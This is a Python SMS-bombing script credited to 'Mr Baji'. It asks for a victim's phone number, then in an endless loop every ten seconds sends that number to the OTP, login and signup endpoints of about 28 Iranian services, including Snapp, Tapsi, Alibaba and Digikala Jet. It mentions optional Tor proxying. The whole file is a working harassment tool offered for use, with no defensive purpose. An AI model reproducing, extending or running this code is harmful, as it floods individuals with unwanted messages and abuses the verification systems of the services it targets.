#Mr Baji
import os
import time
import requests
import re
import json
from threading import Thread

#Proxy using is optional
proxy = ""
#For using proxy you should install Tor on your system.

def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
        if "OK" in snapR.text:
            print ("sended sms:)")
        else:
            print ("Error!")
    except:
        print ("Error!")

def nobatir(phone):
    url = 'https://nobat.ir/api/public/patient/login/phone'
    phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" + phone + "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n"
    headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)  # or do something else with the response

def alopeyk_login(phone):

    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
    phone_value = {
        "type": "CUSTOMER",
        "model": "Firefox 123.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.6.3",
        "uuid": True,
        "phone": phone
    }
    headers = {'content-type': 'application/json'}
    response = requests.post(url, json=phone_value, headers=headers)
    if "OK" in response.text:
            print ("sended sms:)")
    else:
            print (response.text)

def alopeyk_signup(phone):
    url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa'
    phone_value = {
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "firstname": "تست",
        "lastname": "تست",
        "phone": phone,
        "email": "",
        "referred_by": "",
        "lat": None,
        "lng": None
    }
    headers = {'content-type': 'application/json'}
    
    try:
        response = requests.post(url, data=json.dumps(phone_value), headers=headers)
        print(response.json())  # Print the response JSON
    except Exception as e:
        print("Error:", e)
        
def digistyle(phone):
    url = 'https://www.digistyle.com/users/login-register/'
    phone_value = {'loginRegister[email_phone]': phone}
    
    # Send POST request
    response = requests.post(url, data=phone_value)
    
    # Extract token from response content
    match = re.search(r'(?<=token=)(.*)(?=&amp)', response.text)
    if match:
        token = match.group(0)
        # Send GET request to confirm registration
        confirm_url = f'https://www.digistyle.com/users/register/confirm/?token={token}&type=register'
        response = requests.get(confirm_url)
        # Do something with the response if needed
        print(response.text)  # Print the response content
    else:
        print("Token not found in response")
        
def azki(phone):
    url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/'
    phone_value = {"phoneNumber": phone}
    headers = {
        'Content-Type': 'application/json',
        'deviceid': '6'
    }
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def digikala_jet(phone):
    url = 'https://api.digikalajet.ir/user/login-register/'
    phone_value = {"phone": phone}
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def snapp_drivers(phone):
    url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp'
    params = {
        'utm_source': 'snapp.ir',
        'utm_medium': 'website-button',
        'utm_campaign': 'menu'
    }
    data = {
        'cellphone': phone
    }
    
    # Send POST request
    response = requests.post(url, params=params, json=data)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def ostadkar(phone):
    url = 'https://api.ostadkr.com/login'
    phone_value = {"mobile": phone}
    
    # Send POST request
    response = requests.post(url, json=phone_value)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def miare(phone):
    url = 'https://www.miare.ir/api/otp/driver/request/'
    phone_value = {"phone_number": phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def tapsi_drivers(phone):
    url = 'https://api.tapsi.ir/api/v2.2/user'
    phone_value = {
        "credential": {
            "phoneNumber": phone,
            "role": "DRIVER"
        },
        "otpOption": "SMS"
    }
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def tapsi_passenger(phone):
    url = 'https://api.tapsi.ir/api/v2.2/user'
    phone_value = {
        "credential": {
            "phoneNumber": phone,
            "role": "PASSENGER"
        },
        "otpOption": "SMS"
    }
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def banimode(phone):
    url = 'https://mobapi.banimode.com/api/v2/auth/request'
    phone_value = {"phone": phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def drdr(phone):
    url = 'https://drdr.ir/api/v3/auth/login/mobile/init'
    phone_value = {"mobile": phone}
    headers = {
        'content-type': 'application/json',
        'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054'
    }
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def taaghche_login(phone):
    url = 'https://api.taaghche.com/mybook/v4/site/auth/login'
    phone_value = {"contact": phone, "forceOtp": True}
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def taaghche_signup(phone):
    url = 'https://gwl.taaghche.com/v4/site/auth/signup'
    phone_value = {"contact": phone}
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def taaghche_signup(phone):
    url = 'https://gwl.taaghche.com/v4/site/auth/signup'
    phone_value = {"contact": phone}
    headers = {'content-type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content


def komodaa(phone):
    url = 'https://api.komodaa.com/api/v2.6/loginRC/request'
    phone_value = {"phone_number": phone , "forceOtp": True }
    headers = {'Content-Type': 'application/json'}
    
    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)
    
    # Do something with the response if needed
    print(response.text)  # Print the response content

def ghabzino(phone):
    url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    phone_value = {
        "Parameters": {
            "ApplicationType": "Web",
            "ApplicationUniqueToken": None,
            "ApplicationVersion": "1.0.0",
            "MobileNumber": phone,
            "UniqueToken": None,
        }
    }
    headers = {'content-type': 'application/json'}

    # Send POST request
    response = requests.post(url, json=phone_value, headers=headers)

    # Do something with the response if needed
    print(response.text)  # Print the response content

def barghe_man(phone):
    url = 'https://uiapi2.saapa.ir/api/otp/sendCode'
    phone_value = {
        "mobile": phone,
        "from_meter_buy": False
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(phone_value), headers=headers)
    print(response.text)

def vandar(phone):
    url = 'https://api.vandar.io/account/v1/check/mobile'
    phone_value = {
        "mobile": phone
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(phone_value), headers=headers)
    print(response.text)
    
    
def mobit(phone):
    url = 'https://api.mobit.ir/api/web/v8/register/register'
    phone_value = {
        "number": phone
    }
    headers = {
        "Content-Type": "application/json;charset=UTF-8"
    }
    response = requests.post(url, data=json.dumps(phone_value), headers=headers)
    print(response.text)
    
def jabama(phone):
    url = 'https://taraazws.jabama.com/api/v4/account/send-code'
    phone_value = '{"mobile":"' + phone + '"}'
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)
    
def pinorest(phone):
    url = 'https://api.pinorest.com/frontend/auth/login/mobile'
    phone_value = '{"mobile":"' + phone + '"}'
    headers = {'content-type': 'application/json'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)

def tetherland(phone):
    url = 'https://service.tetherland.com/api/v5/login-register'
    phone_value = '{"mobile":"' + phone + '"}'
    headers = {'content-type': 'application/json'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)


def alibaba(phone):
    url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
    phone_value = '{"phoneNumber":"' + phone + '"}'
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)

def drnext(phone):
    url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token'
    phone_values = '{"source":"besina","mobile":"' + phone + '"}'
    headers = {'content-type': 'application/json'}
    response = requests.post(url, data=phone_values, headers=headers)
    print(response.text)

def classino(phone):
    url = 'https://student.classino.com/otp/v1/api/login'
    phone_value = '{"mobile":"' + phone + '"}'
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)

def takshopaccessorise(phone):
    url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request'
    phone_value = '{"mobile_phone":"' + phone + '"}'
    headers = {'content-type': 'application/json;charset=UTF-8'}
    response = requests.post(url, data=phone_value, headers=headers)
    print(response.text)
    
    
def main():
    phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=nobatir, args=[phone]).start()
        Thread(target=alopeyk_login, args=[phone]).start()
        Thread(target=alopeyk_signup, args=[phone]).start()
        Thread(target=digistyle, args=[phone]).start()
        Thread(target=azki, args=[phone]).start()
        Thread(target=digikala_jet, args=[phone]).start()
        Thread(target=snapp_drivers, args=[phone]).start()
        Thread(target=ostadkar, args=[phone]).start()
        Thread(target=miare, args=[phone]).start()
        Thread(target=tapsi_drivers, args=[phone]).start()
        Thread(target=tapsi_passenger, args=[phone]).start()
        Thread(target=banimode, args=[phone]).start()
        Thread(target=drdr, args=[phone]).start()
        Thread(target=taaghche_login, args=[phone]).start()
        Thread(target=taaghche_signup, args=[phone]).start()
        Thread(target=komodaa, args=[phone]).start()
        Thread(target=ghabzino, args=[phone]).start()
        Thread(target=barghe_man, args=[phone]).start()
        Thread(target=vandar, args=[phone]).start()
        Thread(target=mobit, args=[phone]).start()
        Thread(target=jabama, args=[phone]).start()
        Thread(target=pinorest, args=[phone]).start()
        Thread(target=tetherland, args=[phone]).start()
        Thread(target=alibaba, args=[phone]).start()
        Thread(target=drnext, args=[phone]).start()
        Thread(target=classino, args=[phone]).start()
        Thread(target=takshopaccessorise, args=[phone]).start()




        # os.system("killall -HUP tor")
        time.sleep(10)


if __name__ == "__main__":
    main()